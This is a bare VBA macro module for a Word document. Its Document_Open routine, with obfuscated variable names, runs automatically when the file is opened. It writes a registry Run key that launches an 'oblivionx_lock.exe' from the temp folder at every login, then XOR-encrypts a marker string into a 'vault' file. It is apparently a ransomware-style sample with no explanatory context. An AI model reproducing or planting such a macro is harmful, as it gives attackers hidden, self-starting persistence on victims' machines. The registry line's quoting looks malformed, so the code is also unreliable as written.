Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Object
    Dim bwt1msm67xb As String, data As String, enc As String
    Dim pj16ga84d1wp As Long
    Set frs0swbone = CreateObject("WScript.Shell")
    frs0swbone.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\oblivionx", """ & Environ("TEMP") & "\oblivionx_lock.exe"", "REG_SZ"
    bwt1msm67xb = Environ("TEMP") & "\oblivionx_vault\secret.txt"
    data = "top secret marker data"
    enc = ""
    For pj16ga84d1wp = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, pj16ga84d1wp, 1)) Xor 42)
    Next pj16ga84d1wp
    Open bwt1msm67xb For Output As #1
    Print #1, enc
    Close #1
End Sub
